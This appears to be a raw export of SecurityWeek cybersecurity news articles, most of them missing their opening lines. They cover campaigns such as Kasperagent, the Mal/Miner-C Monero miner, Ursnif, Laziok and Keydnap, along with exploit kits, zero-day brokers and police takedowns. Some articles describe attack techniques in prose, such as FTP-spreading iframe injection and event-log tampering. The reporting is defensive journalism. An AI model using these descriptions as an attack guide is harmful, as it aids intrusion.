" }

In early April, Palo Alto Networks and ClearSky also made public the results of a joint investigation into this group. The group uses Windows malware dubbed Kasperagent and Micropsia, and Android malware called SecureUpdate and Vamp in attacks aimed mainly at Palestine.

The documents referenced subjects such as the assassination of Hamas military leader Mazen Fuqaha, and banning of the Palestinian political party Fatah from Gaza. Kasperagent has mainly been used as a reconnaissance tool and downloader, but some newer samples include additional capabilities that allow attackers to steal passwords from browsers, take screenshots, log keystrokes, execute arbitrary commands, and exfiltrate files. While the malware samples found by ThreatConnect were similar to ones analyzed by Palo Alto Networks and ClearSky a few months ago, the command and control (C&C) server they contacted was different. An analysis of the C&C infrastructure showed that the domain contacted by the malware was hosted on an IP address that stored four domains, including two registered by a freelance web developer from Gaza. “Just like we can’t make a definitive determination as to who conducted this campaign, we do not know for sure who it was intended to target. What we do know is that several of the malicious files were submitted to a public malware analysis site from the Palestinian Territories. This tells us that it is possible either the threat actors or at least one of the targets is located in that area,” ThreatConnect said in a blog post. Experts believe the attack may have been aimed at Hamas, Israel or the Fatah party, whose members include the prime minister and president of the Palestinian Authority. The attacks were carried out shortly after Hamas created a parallel institution to run local ministries in Gaza, which caused further tension between Hamas and the Palestinian Authority, and just before the Palestinian Authority held elections in the West Bank.

The malware, detected by the security firm as Mal/Miner-C, leverages infected computers to mine Monero (XMR), an open source privacy-focused cryptocurrency which, unlike Bitcoin, can still be mined using regular computers. The threat is written in NSIS (Nullsoft Scriptable Install System), a scripting language used for creating Windows installers. These types of Trojans are not unheard of. Last month, antivirus company Dr. Web reported spotting a Go-based Monero miner designed to target Linux systems. What makes Mal/Miner-C interesting is the fact that it abuses FTP servers in an effort to spread to as many computers as possible. Some instances of the malware include a component, called tftp.exe, which randomly generates IP addresses and attempts to connect to them using a predefined list of usernames and passwords. If it establishes a successful connection to an FTP service, the malware copies itself to that server and modifies the .html and .php files stored on it. The targeted web files are injected with code that generates an iframe referencing the malware. When users visit these infected webpages, they are presented with a “save file” dialog that serves the malicious files. If victims download and open these files, their systems will become infected with Mal/Miner-C. Sophos identified over 1.7 million individual infections in the first half of 2016, but these instances only corresponded to 3,150 unique IP addresses. That is because the malware copies itself to every folder on an infected FTP server. An Internet scan has showed that there are over 200,000 active FTP servers around the world that allow anonymous remote access, and more than 7,200 of them are not properly configured and have write access enabled. Of these, roughly 5,100 have already been infected with Mal/Miner-C. While the malware has targeted various types of FTP servers, researchers noticed one particular device that is particularly susceptible to abuse. By default, Seagate’s Central NAS product provides a public folder that cannot be deleted or deactivated. If remote access is enabled on the device, attackers can easily plant the malware files in hopes that they will be executed by users once they are discovered. While Mal/Miner-C cannot directly run on Seagate Central, the NAS device can be highly useful for spreading the malware, and Sophos believes that most of these systems have already been infected. After analyzing the wallets used by the cybercriminals to store their profits, researchers determined that they received a total of roughly 58,000 XMR from the MoneroPool mining pool they used. The infected machines had calculated 431,000 hashes per second, which accounted for half of the total pool. When Attila Marosi, senior threat researcher at Sophos, wrote the report on Mal/Miner-C, Monero was worth less than $2, which meant cybercriminals had earned roughly $86,000. However, the value of Monero spiked this month after a popular dark web marketplace called AlphaBay integrated the cryptocurrency. One unit of the digital currency is currently worth more than $13, which means that the profit made by the cybercriminals is significantly higher. " }

After studying 10 years of data from HP's Zero Day Initiative (ZDI) and Verisign's iDefense -- two companies that pioneered the business of purchasing exclusive rights to zero-day vulnerability information -- NSS Labs came to the startling discovery that \"privileged groups\" have access to at least 58 unpatched vulnerabilities targeting products from Microsoft, Apple, Oracle and Adobe. \"These groups have access to critical information that would allow them to compromise all vulnerable systems without the public ever having knowledge of the threats,\" said NSS Labs research director Stefan Frei. In a report titled The Known Unknowns, Frei said the research found that these vulnerabilities remain private -- and unpatched -- for an average of 151 days, providing a wide open window for cyber-criminals and APT groups to launch targeted attacks against consumers and businesses. The data in the NSS Labs does not take into account additional programs that sell exploits and vulnerability data to governments and other buyers. According to Frei, these companies are offering zero-day vulnerabilities for subscription fees that are well within the budget of a determined hacker group.  He provided an example of a subscription package of 25 zero-days per year selling in the range of US$2.5 million. \"This has broken the monopoly that nation-states historically have held regarding ownership of the latest cyber-weapon technology,\" he said.  \"Jointly, half a dozen boutique exploit providers have the capacity to offer more than 100 exploits per year,' Frei added. Frei also acknowledged that the true number is considerably higher than has been estimated since many groups in possession of zero-day flaw information have to incentive to coordinate and share data with affected software vendors. In the case of ZDI and iDefense VCP (Vulnerability Purchasing Program), Frei found that the two companies purchased 2,392 vulnerabilities between 2002 and 2013. \"It is significant that the average time from vulnerability purchase to public disclosure is 133 days for VCP and 174 days for ZDI,\" Frei said, nothing that this is a lengthy period of time for a process of coordinated disclosure. \"It is clear that vulnerabilities acquired by cyber-criminals or by government agencies remain unknown to the public for extended period of time,\" he added. In the report, NSS Labs noted that these bug bounty programs do not purchase all vulnerabilities offered by researchers.  This means that the majority of vulnerabilities purchased are rated as \"highly critical\" and affect products that are widely deployed.   \"This poses a significant risk to enterprises and to society,\" the company warned.

The operation, codenamed Neuland, was led by Germany’s Kriminalinspektion Mayen and supported by Europol’s European Cybercrime Centre (EC3). The first phase of this action took place in April 2016 and it targeted the operators of counter antivirus and crypter services, and their Germany-based customers. One 22-year-old individual was arrested and 170 other suspects from all regions of Germany had their homes and offices searched. Searches were also carried out at the time in France, the Netherlands and Canada. Hundreds of desktop computers, laptops, smartphones, and storage devices were seized in the first part of the campaign. German authorities said at the time that the average age of the suspects was 23. The second phase of the operation, announced by Europol on Wednesday, took place last week and it targeted the international customers of the same two anti-malware detection services. Police in Cyprus, Norway, the Netherlands, Italy and the United Kingdom arrested six people and questioned 36 other suspects. Officers searched 20 houses and seized a large number of devices. At around the time of the first phase of the law enforcement operation, a report from Dell SecureWorks on underground hacker markets revealed that the price of crypters, which provide a layer of defense for the malicious core of malware, had reached $80-$440, a significant increase from 2014, when they had been sold for only up to $150. Two individuals suspected of running similar services were also targeted by law enforcement in the United Kingdom in November 2015. A man and a woman believed to be the operators of a counter antivirus service called reFUD.me and a crypter named Cryptex Reborn were arrested.

Though the years have passed however, there is no shortage of machines still vulnerable to attacks on one of the vulnerabilities the malware exploited as it trotted across the globe. According to a paper released by Kaspersky Lab, CVE-2010-2568 remains a widely exploited security hole. Despite the age of the vulnerability, Kaspersky Lab detected tens of millions of exploits targeting the bug between November 2013 and June 2014, though not all may correlate to individual attacks due to the way the bug is exploited.  The vulnerability is a shortcut handling error in Microsoft Windows that affects XP, Vista, Windows 7 and Windows Server 2003 and 2008. If successfully exploited, attack code could be executed when the operating system displays the icon of a malicious shortcut file. The vulnerability was patched in August of 2010. \"The first malware exploiting this vulnerability was registered in July 2010,\" the Kaspersky Lab report explained. \"Specifically, the worm Sality uses this vulnerability to distribute its own code: the worm generates vulnerable shortcuts and distributes them through LAN. Should a user open the folder containing such shortcut, the malicious program immediately begins launching. After Sality and Stuxnet this vulnerability was used by the well-known Flame and Gauss spyware.\" Most of the detections of exploits for the vulnerability are registered in Vietnam, India, Indonesia, and Brazil, according to the report. Kaspersky Lab speculated that the persistence of the vulnerability may be due to the fact that many network administrators are not paying close enough attention to public servers under their control. As a result, malware such as Sality continue to propagate. \"Non-protected workstations running under a vulnerable version of Windows may become the entry point for a targeted of attack on the company,\" according to report. \"As we have pointed out in a blog back in May, some vulnerabilities never die,\" Barry Shteiman, director of security strategy at Imperva, said in a statement. \"It’s not because they are overly complex or a patch has not yet been built...In many of the cases it's just because customers just don’t have the cycles or the awareness to patch. It is not uncommon to see systems go unpatched for years simply because there may be complexity involved with changes that the fix introduces.\" Hackers understand this, he added, which is why old vulnerabilities remain in use today. Other common Microsoft vulnerabilities observed being exploited during the November 2013 to June 2014 time period include CVE-2012-0158 and CVE-2010-3333, according to the report. Overall, Kaspersky Lab recorded a total of 15.06 million exploit detections on 3.64 million computers running various versions of Windows. Roughly 53 percent of these involved exploits written for Java vulnerabilities, the firm found.  " }

During the past few days, Malwarebytes detected multiple WordPress sites injected with a malicious iframe. The iframe redirects victims to a phony version of The Pirate Bay site. Once there, victims are served the Nuclear exploit kit via a drive-by download attack. \"This exploit kit targets most browser plugins but it focuses in particular on the Flash Player which was affected by no less than three zero days in the span of a month,\" said Jerome Segura, senior security researcher at Malwarebytes Labs. According to Segura, Malwarebytes does not have the exact numbers of how many sites are impacted. However, he said the attack appears to be a specific or targeted campaign. As of this afternoon, the phony site is still up. \"And I can add something that I didn't mention originally, in that the site does not index real torrent results but rather pushes a program, maybe to collect affiliate kickbacks,\" he said.  \"We believe it has to do with a WordPress plugin rather than the CMS itself,\" Segura noted. \"We have seen similar attacks in recent months taking advantage of the RevSlider Plugin and this could be linked to it.\" \"Once the vulnerability has been exploited, the bad guys usually upload backdoors and shells designed to not only maintain control of the compromised website but also alter its core files, such as injecting iframes,\" he added. WordPress is one of the most popular - and most targeted - content management systems. In the case of the RevSlider attack, more than 100,000 WordPress websites were found to have been compromised.  Segura suggested anyone running WordPress make sure their site and plugins are fully patched, and recommended people not log into their site from unsecure access points such as public Wi-Fis. The attack is ongoing, Segura said.   " }

The group calling itself Shadow Brokers has published several tools and exploits stolen from the Equation Group, cyberspies believed to be working for the U.S. National Security Agency (NSA). One of the tools leaked by the Shadow Brokers in April is DanderSpritz, a post-exploitation framework that allows hackers to harvest data, bypass and disable security systems, and move laterally within a compromised network. An interesting DanderSpritz plugin is EventLogEdit, which is designed for manipulating Windows Event Log files to help attackers cover their tracks. While hacker tools that modify event logs are not unheard of, EventLogEdit is more sophisticated compared to others as it allows removal of individual entries from the Security, Application and System logs without leaving any obvious clues that the files had been edited. “While we understand that event logs can be cleared and event logging stopped, surgically editing event logs is usually considered to be a very advanced capability (if possible at all),” Jake Williams, founder of Rendition Infosec and an expert in Shadow Broker leaks, said after news of the tool emerged. “Knowing that some attackers apparently have the ability to edit event logs can be a game changer for an investigation.” Since the tool has been made public by the Shadow Brokers, it gives less sophisticated actors the opportunity to cover their tracks and hamper forensic investigations. Fortunately, Fox-IT researchers have found a way to determine if EventLogEdit has been used on a system, and even recover the event log entries that it removed. “When eventlogedit is used, the to-be-removed event record itself isn’t edited or removed at all: the record is only unreferenced. This is achieved by manipulation of the record header of the preceding record. Eventlogedit adds the size of the to-be-removed-record to the size of the previous record, thereby merging the two records. The removed record including its record header is now simply seen as excess data of the preceding record,” researchers explained. “You might think that an event viewer would show this excess or garbage data, but no. Apparently, all tested viewers parse the record binXml message data until the first end-tag and then move on to the next record.” Experts pointed out that the removed records should be seen by organizations that send logs on the fly to a central server, but sophisticated attackers are likely to hijack that machine as well in an effort to hide their activities. However, since the EventLogEdit tool leaves the removed record and record header in their original state, full recovery of the data is possible.  Fox-IT has released an open source Python script that identifies and exports removed event log records, allowing organizations to check if they have been targeted by the NSA or other threat actor that may be leveraging EventLogEdit. Users who don’t want to bother with compiling the code themselves can download a version of the tool provided as a Windows executable. " }
{ "_id" : { "$oid" : "5b27c49c6cefc41c844ab380" }, "Category" : "Malware", "Title" : "New Ursnif Variant Shows Developers Are Careless", "Address" : "https://www.securityweek.com/new-ursnif-variant-shows-developers-are-careless", "Date" : "September 02, 2016", "Article" : "Researchers at Seculert have conducted an extensive analysis of the Ursnif banking Trojan and, in addition to finding a few improvements, they identified some mistakes made by the threat’s developers. One of the changes spotted by experts is related to the malware’s sleeping feature, which increases its chances of evading sandbox detection. Sandboxing solutions typically analyze a file for only 2-3 minutes before moving on to the next sample. If a piece of malware becomes active only after a few minutes, it’s more likely to evade detection. Earlier variants of Ursnif used sleep functions such as WaitForSingleObject or WaitForMultipleObjects for this task. However, the Trojan’s developers recently started relying on Microsoft’s Timers API, which, according to Seculert, is a unique approach. Researchers also noticed some changes in the way Ursnif obfuscates outbound traffic in an attempt to avoid being detected by network security solutions that rely on communication pattern signatures to identify threats. The domain generation algorithm (DGA) observed by experts in the new Ursnif variant creates domain names using words taken from a “license.txt” file hosted on Apple’s official website. However, the DGA is poorly coded and it contains a logic flaw that leads to the loss of one of the words creating the domain name. “I believe the malware authors have no idea they have such a bug in their code because they are probably using the exact same piece of code to know which domains they should buy,” Ariel Koren, security researcher at Seculert, explained in a blog post. Ursnif was one of the six banking Trojan families recently spotted targeting users in Canada. After reverse engineering its DGA, Seculert sinkholed one of the C&C domains and found a total of nearly 7,000 Ursnif infections over a period of five days. The highest number of infections was in Canada (3,734), followed by Poland (1,163) and the United States (958). Koren pointed out that the DGA allows cybercriminals to easily change the file that provides the wordlist used for generating domain names. Another mistake made by Ursnif developers is that they left behind some code that makes it easy to run the malware in virtual environments. In order to conduct tests on their own virtual machines, the developers added a check that instructs the malware to ignore verifying the presence of virtual machines if the file “C:\\321.txt” exists on the system. This allows researchers to analyze the malware in VMs without making any configuration changes simply by adding the “321.txt” file to the system.

But while the effort may have started a ten-count, some say the botnet was far from knocked out.   The takedown operation disrupted a botnet that is held responsible for infecting more than two million computers by targeting search results on Google, Bing and Yahoo search engines and costing online advertisers $2.7 million a month. The botnet hijacks people's search engine results and redirects them to sites they had not intended to go to in order to commit click fraud. ZeroAccess relies on a peer-to-peer infrastructure that allows cybercriminals to control it remotely through tens of thousands of different computers.   To combat the situation, Microsoft recently filed a civil suit against the people behind the botnet and received authorization from the U.S. District Court for the Western District of Texas to simultaneously block incoming and outgoing communications between computers located in the U.S. and the 18 identified Internet Protocol (IP) addresses being used to commit fraud. In addition, Microsoft took control of 49 domains associated with ZeroAccess, while A10 Networks provided Microsoft with advanced technology to support the disruptive action.   However, Microsoft's work comes up short. In a joint blog post, Yacin Nadji, a Ph.D. Candidate at Georgia Institute of Technology, and Damballa Chief Scientist Manos Antonakakis noted that any meaningful action against ZeroAccess must disrupt its peer-to-peer (P2P) communications channel.   \"Disabling the click-fraud component is trivially countered by the botmaster by simply pushing an updated binary over the P2P channel with fresh click-fraud configurations,\" they noted. \"This extensive legal work can be undone in a matter of hours.\" According to a report, the operators did push out a configuration file to infected systems to bring the click fraud network back online, but the within a few hours the servers were back offline.      Fears about click fraud led to the Interactive Advertising Bureau (IAB) recently issuing a set of best practices designed to help publishers, networks and buyers reduce the risk of fraud on the Internet.   \"The companies that participate in the digital advertising supply chain have been struggling with how to handle criminal enterprises intent on gaming the system,\" said Steve Sullivan, vice president of advertising technology for IAB, in a statement. \"These fraudsters are diluting the value of all legitimate inventory while simultaneously diminishing the integrity of the entire digital marketing industry. The introduction of these best practices is a first step in reducing the marketplace repercussions of these illegal activities.\" " }

First observed between January and February, the attack campaign was spotted using a new piece of malware dubbed 'Laziok', which Symantec has classified as a reconnaissance tool and an information stealer. The attacks are focused on the petroleum, gas and helium industries, with by far the largest percentage of victims (25 percent) being located in the United Arab Emirates. Saudi Arabia, Pakistan and Kuwait account for 10 percent apiece of the Laziok infections detected by Symantec. Five percent of the infections occurred in the United States. \"The initial infection vector involves the use of spam emails coming from the moneytrans[.]eu domain, which acts as an open relay Simple Mail Transfer Protocol (SMTP) server,\" blogged Symantec Security Response Manager Christian Tripputi. \"These emails include a malicious attachment packed with an exploit for the Microsoft Windows Common Controls ActiveX Control Remote Code Execution Vulnerability (CVE-2012-0158). This vulnerability has been exploited in many different attack campaigns in the past, such as Red October.\" If a vulnerable user opens the email attachment – typically an Excel file – the exploit code is executed and the malware is dropped. Once on the system, Laziok begins collecting system configuration data, such as: installed software, RAM size and GPU details. If the attackers judge the infected system to be interesting, the attack continues on to the next phase. \"Once the attackers received the system configuration data, including details of any installed antivirus software, they then infect the computer with additional malware,\" Tripputi noted. \"In this campaign, the attackers distributed customized copies of Backdoor.Cyberat and Trojan.Zbot which are specifically tailored for the compromised computer’s profile. We observed that the threats were downloaded from a few servers operating in the US, UK, and Bulgaria.\" \"The group behind the attack does not seem to be particularly advanced, as they exploited an old vulnerability and used their attack to distribute well-known threats that are available in the underground market,\" Tripputi blogged.  \"However,\" he added, \"many people still fail to apply patches for vulnerabilities that are several years old, leaving themselves open to attacks of this kind. From the attacker’s perspective, they don’t always need to have the latest tools at their disposal to succeed.

The threat actor dubbed by the U.S. government “Hidden Cobra” is better known in the infosec community as Lazarus Group, which is believed to be behind several high-profile attacks, including the ones targeting Sony Pictures, Bangladesh’s central bank, and financial organizations in Poland. Links have also been found between the threat actor and the recent WannaCry ransomware attacks, but some experts are skeptical. The joint alert from the FBI and the DHS provides indicators of compromise (IoC) associated with a botnet known as “DeltaCharlie.” The North Korean government has allegedly used DeltaCharlie, which has been detailed in Novetta’s “Operation Blockbuster” report, to launch DDoS attacks. “DeltaCharlie is a DDoS tool capable of launching Domain Name System (DNS) attacks, Network Time Protocol (NTP) attacks, and Character Generation Protocol attacks,” US-CERT said. “The malware operates on victims’ systems as a svchost-based service and is capable of downloading executables, changing its own configuration, updating its own binaries, terminating its own processes, and activating and terminating denial-of-service attacks.” US-CERT has shared information on exploits, malware, IP addresses, file hashes, network signatures, and YARA rules associated with Hidden Cobra in an effort to help defenders detect the group’s attacks. However, it noted that “further research is needed to understand the full breadth of this group’s cyber capabilities.” The agency warned that, in some cases, the DDoS malware was present on victims’ networks for a significant period of time. Network administrators have been advised to follow a series of recommendations for mitigating attacks and responding to unauthorized network access. While North Korea is believed to be responsible for several major cyberattacks, experts have also observed sophisticated attacks aimed at the country. Last month, Cylance reported seeing a new fileless attack that seemed to have Chinese origins, and Cisco detailed a RAT used to spy on organizations linked to North Korea.

Many Android adware and malware families that make it onto Google Play abuse the BIND_ACCESSIBILITY_SERVICE permission to obtain administrator privileges and for other unauthorized activities. As a result, Google informed application developers last month that they had 30 days to either demonstrate that the accessibility service is actually needed to help users with disabilities or remove the use of the permission from their product. The Internet giant warned that those who fail to comply would risk having their apps pulled from the official store. The developers of several popular applications that use the accessibility service for various features that may otherwise be difficult to implement complained on various forums and reached out to Google with their concerns. The list of impacted apps includes the LastPass password manager and the Tasker automation app – the latter is not designed specifically for people with disabilities, but it is used by them. In response to complaints, Google told developers, “We’re evaluating responsible and innovative uses of accessibility services. While we complete this evaluation, we are pausing the 30 day notice we previously contacted you about.” In the meantime, developers whose Android applications require the BIND_ACCESSIBILITY_SERVICE permission must clearly inform users of why the service is needed before asking them to enable it. Developers must also convince Google that their app uses the permission for responsible and innovative purposes. “Your disclosure must meet the following requirements: In all cases, you must have a disclosure to explain why you need to observe user actions in general using the Accessibility Service API. For each accessibility capability declared, you must have an accompanying disclosure to describe the app functionality that the Accessibility Service permission is enabling for your app. (The default disclosure tells us ‘what’, but you must disclose to the user ‘why’),” Google told developers. The information provided by application developers on how they use the service will help Google make a decision regarding the use of the accessibility service. " }

Much of the time, they rely on social engineering that takes advantage of trust on social networking forums or curiosity in news related to the conflict in Syria. For example, a YouTube video showing injured victims of recent bombings was used to prompt viewers to download a malicious application.  Other attacks take advantage of the victim's desire for better security. \"If you thought the era of fake antivirus programs was over, here comes a newly developed sample to challenge your beliefs,\" according to the Kaspersky Lab report. \"With the innocent title of “Ammazon Internet Security”, this malicious application tries to mimic a security scanner, even including a quite thorough graphical user interface and some interactive functionality.\" The attackers also offer a modified version of a legitimate app known as 'Total Network Monitor'. \"What this modified version does not show is the remote connection made to a host where f system information is dumped,\" according to the report. \"The actual infection is performed when first clicking on the installer, which uses obfuscation to hide all malicious activity until the “legitimate” tool is completely installed.\" \"A combination of factors – social engineering, rapid app development and remote administration tools for taking over the victim’s entire system – creates a worrying scenario for unsuspecting users,\" said Ghareeb Saad, senior security researcher of the Global Research & Analysis Team at Kaspersky Lab, in a statement. \"We expect attacks by Syrian malware to continue and evolve both in quality and quantity. Therefore, users should be especially careful of suspicious links, double checking their downloads and have a reliable and comprehensive security solution installed.\" " }

RIG, one of the exploit kits that replaced Angler after its demise, has been using Flash exploits to infect computers with malware. However, on August 20 and August 21, researchers at Cyphort spotted a new build that included several other exploits as well. The new variant was only seen for two days, which led experts to believe that cybercriminals might have only conducted some tests. The new version of RIG used several old and newer exploits targeting Microsoft products. One of them targets CVE-2016-0189, a remote code execution vulnerability in the JScript and VBScript scripting engines used in Windows. The flaw, which Microsoft patched in May, can be exploited through the Internet Explorer web browser. A proof-of-concept (PoC) for CVE-2016-0189 was released by researchers on June 22 and, a few weeks later, it was adapted by cybercriminals and added to the Neutrino exploit kit. RIG developers are apparently also working on integrating it into their creation. Another exploit spotted in the new RIG build was for CVE-2013-2551, a use-after-free vulnerability in Internet Explorer that was disclosed by VUPEN researchers in 2013. The flaw has been exploited in numerous attacks over the past years, including by the Neutrino exploit kit. Experts also noticed that RIG had leveraged an exploit for CVE-2014-6332, a Windows OLE vulnerability that can be used for remote code execution via Internet Explorer. This security hole has also been used by Neutrino, but it has also been observed in more sophisticated APT campaigns. Cyphort also discovered the use of a Silverlight exploit and pointed out that this was the first time RIG leveraged Silverlight flaws to infect victims. In addition to the new exploits, the latest RIG build makes some changes to the C&C communication method used in the last couple of months. The URL patterns used until now have been relatively predictable, allowing security solutions to easily block the threat. However, RIG developers have been testing new patterns that could help their creation avoid easy detection. " }

Google security engineer Adam Langley said the company traced the fraudulent certificates to Agence nationale de la sécurité des systèmes d’information (ANSSI), a French certificate authority that falls under the government's cyber-security agency. \"ANSSI has found that the intermediate CA certificate was used in a commercial device, on a private network, to inspect encrypted traffic with the knowledge of the users on that network. This was a violation of their procedures and they have asked for the certificate in question to be revoked by browsers. We updated Chrome’s revocation metadata again to implement this,\" Langley announced. In a separate statement, ANSSI blamed \"human error\" for the incident. From the ANSSI statement:  As a result of a human error which was made during a process aimed at strengthening the overall IT security of the French Ministry of Finance, digital certificates related to third-party domains which do not belong to the French administration have been signed by a certification authority of the DGTrésor (Treasury) which is attached to the IGC/A. The mistake has had no consequences on the overall network security, either for the French administration or the general public. The aforementioned branch of the IGC/A has been revoked preventively. The reinforcement of the whole IGC/A process is currently under supervision to make sure no incident of this kind will ever happen again. Google's Langley described the incident as a \"serious breach\" and warned that the company is considering additional actions.  He did not elaborate. Langley also stressed the importance of the company's Certificate Transparency project, which attempts to fix structural flaws in the SSL certificate system.   The Certificate Transparency project works to eliminate vulnerabilities in the system by providing an open framework for monitoring and auditing SSL certificates in real time.   The goal is to detect SSL certificates that have been mistakenly issued by a certificate authority or maliciously acquired from an otherwise unimpeachable certificate authority. It also makes it possible to identify certificate authorities that have gone rogue and are maliciously issuing certificates. " }

The suspect, who made his first court appearance in Minneapolis on Monday, has been charged with wire fraud, computer fraud and conspiracy. Sahurovs and Marina Maslobojeva were arrested in Latvia in 2011 as a result of an international law enforcement operation dubbed “Trident Tribunal.” The operation targeted two massive scareware campaigns believed to have caused more than $74 million in losses to over one million people. Sahurovs, known online as \"Piotrek,\" Piotrek89\" and \"Sagade,\" was released shortly after his arrest and he fled. He was arrested once again by law enforcement authorities in Poland in November 2016 and now he has been extradited to the U.S. The man was at one point the FBI’s fifth most wanted cybercriminal – the agency had offered a reward of up to $50,000 for information leading to his arrest. According to authorities, the suspect and other members of the conspiracy approached the Minneapolis Star Tribune’s news website, startribune.com, on behalf of a fake advertising agency that allegedly represented an American hotel chain. They purchased online advertising space from the news website and modified the initial ads with malicious code designed to deliver scareware to the site’s visitors. The scareware delivered by the group informed victims that their computers were infected with malware and instructed them to pay nearly $50 for a so-called antivirus software that would allegedly address the problem. While the Star Tribune is the only victim named in the indictment, the FBI said the cybercriminals used similar tactics against numerous other online businesses. Authorities said the scheme generated more than $2 million for the cybercriminals.

According to research from Symantec, a number of botnet offerings have surfaced to provide users of the Twitch streaming video platform a shortcut for building their audience. Introduced in June 2011, Twitch now boasts 1.5 million unique broadcasters and 100 million unique viewers per month. That growth has presented a new revenue stream for scammers looking to help Twitch broadcasters build their viewership. \"The popularity of Twitch allows some broadcasters to earn money while streaming their videos, provided that they have a large enough audience,\" blogged Symantec researcher Lionel Payet. \"While many broadcasters have managed to legitimately earn their viewers, others have attempted to artificially inflate their viewership figures by renting a botnet. Some of these botnets were created by infecting victims’ computers with malware and forcing them to keep Twitch streams open in the background.\" Broadcasters can earn money through their Twitch streams in a number of ways, including having viewers subscribe to broadcasters' channels on a monthly basis in order to access new perks, accepting donations from viewers and displaying ads before, during or after their streams, Payet noted. \"Before broadcasters can take part in these revenue programs, they first need to gain a large audience that views their content regularly−an average concurrent viewership of more than 500 viewers,\" the researcher added. In response to this reality, a market has emerged to help people build an audience of bots for their Twitch channels. Similar scams are also a reality for YouTube. \"During our research, we found several Twitch botnet services that were for sale both on underground forums and on the open web,\" Payet explained. \"These services allow people to rent bots over a period of time to boost their Twitch channel viewership stats. The offerings are marketed as being easy for customers to set up. We also found that many services offered a single application that could generate a huge number of fake Twitch channel viewers.\" \"For one botnet service, the seller claims that each “victim” on the botnet can view five streams on broadcasters’ Twitch channels,\" he continued. \"The affected computer is seemingly forced to open the Twitch channel streams, though the streams are hidden and muted so that the computer’s owner is unaware that anything is amiss.\" Another service let broadcasters rent different botnet packages. Along with viewers, the service also offers \"chatters\" – bots that post messages in the chat section on the broadcasters' Twitch streams. Prices ranged from $29.99 (USD) for 100 viewers and 40 chatters to $159 for 1,000 viewers and 400 chatters. Yet another service offers monthly subscriptions for Twitch bot services starting at $24.95. In addition to offering viewers and chatters, this service also provides customer support to help broadcasters set up these bots to view their channels. According to Symantec, the botnets have been linked to malware known as Inflabot, which disguises itself as a Chrome or Adobe software update. The malware has mainly infected computers in Russia, Ukraine, U.K. and the U.S. and appears to have come from cybercriminals in Russia. \"Once Trojan.Inflabot compromises a computer, it connects to the malware author’s community page on the Russian social network site vk.com,\" Payet blogged. \"This page includes a URL to the server that gives the malware details on which Twitch stream to visit, along with the referrer URL. This allows the malware to force the compromised computer to view a broadcaster’s Twitch channel.\" \"While many broadcasters stream their gameplay online as a hobby, some have managed to turn it into a well-paid full time job,\" he noted. \"Over the past few years, this business model has grown sharply, so it’s unsurprising that scammers are piggybacking on the industry in a parallel underground economy.\" Just recently, Twitch forced users to reset their passwords after it was revealed that user account information had been accessed without authorization.    " }

The report is based on data collected by the security firm from more than 100 investigations. Four of these cases are analyzed in detail in the report, including a SamSam ransomware attack on a commercial services organization, a cybercrime operation aimed at a manufacturer’s e-commerce application, a PoS malware incident targeting a large retailer, and a NotPetya infection. CrowdStrike has determined that organizations continue to improve their ability to detect intrusions on their own. The percentage of firms that self-detected a breach increased to 68 percent, up from 57 percent in the previous year. As for dwell time, which is the number of days between the initial intrusion and detection, the average has decreased slightly to 86 days. CrowdStrike pointed out that it still takes some organizations as much as 800 to 1,000 days to detect a breach, but these cases are an exception. “Regardless of dwell time duration, automated systems may eventually detect an intrusion, but by the time human staff is alerted and aware it’s often too late: the attackers must be stopped before they can achieve their objectives,” CrowdStrike said in its report. Of the attacks analyzed by CrowdStrike, the most prevalent were aimed at stealing intellectual property, stealing money, stealing personally identifiable information (PII), and ransom or extortion. In more than one-third of attacks, hackers gained access to the targeted organization’s systems using web server, web application or web shell exploits, or file uploaders. Other commonly seen attack vectors were remote access via RDP or VPN (23%), supply chain compromise (12%), social engineering and phishing (11%), and cloud-based service exploits (11%). Roughly two-thirds of the attacks analyzed by the security firm were fileless – they involved malicious code being written to and executed from memory, harvesting credentials via phishing or social engineering, remote logins via stolen credentials, and exploits targeting web applications. CrowdStrike also noticed that tactics and techniques typically used by nation-state actors have been increasingly leveraged by cybercrime groups. “These include fileless malware and ‘living off the land’ techniques involving processes native to the Windows operating system, such as PowerShell and WMI (Windows Management Instrumentation),” CrowdStrike said. “Many also employ anti-forensics tools and methods in an effort to erase signs of their presence and increase dwell time. Brute-force attacks on RDP (remote desktop protocol) servers are also prevalent in these cases.” Attackers are also increasingly turning to self-propagating malware, particularly in the case of ransomware such as the notorious WannaCry. These attacks are often successful due to organizations failing to update critical systems and deploying comprehensive security technologies. " }

The security firm ESET warned last month that a new Mac OS X malware started doing the rounds. The threat, dubbed OSX/Keydnap, is capable of stealing the content of the OS X keychain and maintaining a permanent backdoor on the infected system. At the time, researchers were uncertain how Keydnap had been distributed, but they suspected that cybercriminals used spam messages and downloads from untrusted websites. In reality, it turns out that the malware has also been distributed from a legitimate website. According to ESET, cybercriminals compromised the official Transmission site and replaced the legitimate application with a malicious version. Experts believe the malware was available for download as Transmission v2.92 between August 28 and August 29. Users who downloaded the app in this timeframe can determine if they are infected by checking if certain files associated with the malware can be found on their system. Indicators of compromise (IoC) are available on ESET's website. This was not the first time Mac malware had been served from the Transmission website. In March, Palo Alto Networks warned that a piece of ransomware dubbed KeRanger, which is believed to be based on Linux.Encoder, was delivered via the official Transmission installer. ESET has found several similarities between KeRanger and Keydnap, such as the fact that both malicious apps were signed with legitimate code-signing certificates that allowed them to bypass Apple’s Gatekeeper feature. Researchers also noticed similarities in the code, including the path and parameter used for the command and control (C&C) URL resource. The version of Keydnap delivered via the Transmission website is version 1.5. Compared to the version analyzed by ESET last month, it includes a standalone Tor client that allows it to reach its C&C server over the Tor network without needing a separate Tor2Web relay. It also includes a new command that allows cybercriminals to set a different URL for the C&C server.

After surveying 755 IT security professionals who are involved in protecting organizations from targeted attacks, the Ponemon Institute found that current technology controls against APTs \"are not working\" and warned that the average cost to restore a company's reputation following an APT attack is in the range of $9.4 million. Not surprisingly, the Institute found that malware is almost always used as the source of an APT attack.  More than half of the respondents (68%) say zero-day attacks that look to bypass firewalls, intrusion detection systems, and anti-malware programs are the greatest threats to an organization. The security pros say third-party software from Oracle (Java) and Adobe (Reader) pose the most risk because these are the most difficult applications to ensure that all security patches have been fully implemented in a timely fashion. According to the study, the security practitioners also complained about difficulties in managing security patches from Microsoft (Windows) and Adobe (Reader and Flash). Despite these risks, 75% of those surveyed acknowledged that their company continued to use Java and Reader in the production environment knowing that vulnerabilities exist and a viable security patch is unavailable.  The security professionals explained that the company could not afford the cost of downtime waiting for the patch to be implemented; or they simply did not have the professional staff available to implement a security patch. In the case of Oracle Java, the survey found that Java vulnerabilities are very difficult to fix (patch) or resolve. Sixty-one percent of respondents say that a realistic timeframe for patching Java in their organization is once per month or quarter. Despite the risk 